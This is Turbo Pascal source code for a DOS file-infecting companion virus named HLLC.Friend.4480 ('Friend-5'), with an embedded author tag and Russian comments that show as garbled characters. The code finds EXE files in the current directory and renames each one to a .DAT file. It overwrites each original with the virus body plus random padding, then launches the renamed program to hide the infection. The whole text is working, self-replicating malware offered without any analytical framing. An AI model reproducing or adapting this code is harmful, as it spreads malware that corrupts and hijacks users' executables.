   {
     ‚¨àãá HLLC.Friend.4480 ¨«¨ Friend-5.
     *â® ä ©«®¢ë© ª®¬¯ ì® ¢¨àãá, ¯®à ¦ îé¨© EXE-ä ©«ë ¢ â¥ªãé¥¬ ª â «®£¥.
     * ©¤¥ ï ¦¥àâ¢  ¯¥à¥¨¬¥®¢ë¢ ¥âáï ¢ DAT-ä ©«,   ¢¨àãá § ¯¨áë¢ ¥âáï
     ¢¬¥áâ® ¥¥ ¢ EXE-ä ©«. —â®¡ë ¯¥à¥¤ âì ã¯à ¢«¥¨¥ ¯®à ¦¥®¬ã ä ©«ã,
     ¢¨àãá § ¯ãáª ¥â DAT-ä ©« !!!
   -----------------------------------------------------------------------------}
   {$M 5000, 0, 5000}
   uses dos;
   const virsize=4480;                         {¤«¨  ¢¨àãá }
         d='.DAT';
   var  ds:dirstr;
        ns:namestr;
        es:extstr;
        g:file;
        mas:array[1..virsize] of char;         {â¥«® ¢¨àãá }
        st:string;
        par:string;                            {¯ à ¬¥âàë ª®¬ ¤®© áâà®ª¨}
        i:integer;
        ch:byte;
   {----------------------------------------------------------------------------}
   procedure Zar(n:string);                    {¯à®æ¥¤ãà  § à ¦¥¨ï}
   var b:file;
   begin
   Randomize;                                  {¨¨æ¨¨àã¥¬ £¥¥à â®à}
   fsplit(n,ds,ns,es);
   st:=ds+ns+d;
   assign(g,st);{$I-}reset(g,1);{$I+}          {*à®¢¥àï¥¬, ¥áâì «¨ ã¦¥ ä ©«}
                                               {á à áè¨à¥¨¥¬ DAT}
   if ioresult<>0 then                         {…á«¨ ¥â => ¥éñ ¥ § à ¦¥...}
     begin
     assign(b,n);
     rename(b,st);                             {... ¯¥à¥¨¬¥®¢ë¢ ¥¬ ¦¥àâ¢ã}
     assign(b,n);
     rewrite(b,1);                             {... á®§¤ ¥¬ ª®¬¯ ì®}
     blockwrite(b,mas,virsize);                {... ¯¨è¥¬ ¢¨àãá}
     for i:=1 to random(500) do                {... ¯¨è¥¬ ¬ãá®à}
       begin
       ch:=random(250);
       blockwrite(b,ch,1);
       end;
     close(b);                                 {§ à ¦¥¨¥ § ¢¥àè¥® !}
     end
   else close(g);
   end;
   {-----------------------------------------------------------------------------}
   procedure Find;                             {¯®¨áª ¯®â¥æ¨ «ìëå ¦¥àâ¢}
   var s:searchrec;
       f:file;
   begin
   assign(f,paramstr(0));
   reset(f,1);
   blockread(f,mas,virsize);                   {áç¨âë¢ ¥¬ ¢¨àãá ¢ ¯ ¬ïâì}
   close(f);
   findfirst('*.exe',$21,s);                   {¨é¥¬ ¦¥àâ¢ë...}
   while doserror=0 do
     begin
     zar(s.name);                              {¢ë§ë¢ ¥¬ § à ¦¥¨¥}
     findnext(s);                              {á®¢  ¨é¥¬...}
     end;
   end;
   {-----------------------------------------------------------------------------}
   begin
   asm
     jmp @1
     db  '[Friend-5, Duke/SMF]'               {¬®¨ ª®¯¨à ©âë ;)}
     @1:
   end;
   fsplit(paramstr(0),ds,ns,es);
   st:=ds+ns+d;
   assign(g,st);{$I-}reset(g);{$I+}            {¥á«¨  ©¤¥ ¯®à ¦¥ë© ä ©«...}
   if ioresult=0 then
     begin
     close(g);
     par:='';                                  { â® á®åà ï¥¬ ¯ à ¬¥âàë...}
     for i:=1 to paramcount do par:=par+' '+paramstr(i);
     exec(st,par);                             { ¨ § ¯ãáª ¥¬ ¦¥àâ¢ã ¢ DAT-ä ©«¥!}
     end;
   Find;                                       {¯à®¢®¤¨¬ ¯®¨áª ¦¥àâ¢}
   end.
